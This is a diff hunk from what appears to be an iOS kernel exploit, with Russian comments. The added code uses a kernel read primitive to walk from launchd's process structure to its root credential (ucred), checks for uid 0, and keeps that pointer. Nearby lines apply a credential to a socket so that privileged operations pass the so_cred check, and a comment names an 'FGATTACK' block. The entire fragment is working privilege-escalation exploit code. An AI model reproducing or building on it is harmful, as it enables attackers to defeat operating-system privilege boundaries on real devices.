@@ -2398,6 +2398,15 @@ static NSString *kpFmtSptmFn(uint64_t raw)
             // привилегии (bind на низкий порт / IP_HDRINCL) проверяются по so_cred.
             {
                 extern uint64_t rwSocketPcb;
+                extern int controlSocket;
+                // rootZVA живёт внутри блока FGATTACK — пересчитываем локально
+                uint64_t rootZVA = 0;
+                {
+                    uint64_t ldP = [self findSelfProcByPidFast:1 log:nil];
+                    uint64_t ldRo = kpLooksLikeKernelPointer(ldP) ? kp_untag_ptr(early_kread64(ldP + koffsetof(proc, proc_ro))) : 0;
+                    uint64_t ldUc = kpLooksLikeKernelPointer(ldRo) ? kp_untag_ptr(early_kread64(ldRo + koffsetof(proc_ro, ucred))) : 0;
+                    if (ldUc && (uint32_t)early_kread64(ldUc + 0x18) == 0) rootZVA = ldUc;
+                }
                 uint64_t sockVA = rwSocketPcb ? kp_untag_ptr(early_kread64(rwSocketPcb + off_inpcb_inp_socket)) : 0;
                 uint64_t sPA = kpLooksLikeKernelPointer(sockVA) ? kvtophys(sockVA & ~0x3fffULL) : 0;
                 int sT = sPA ? kpFrameTypeOf(sPA) : -1;
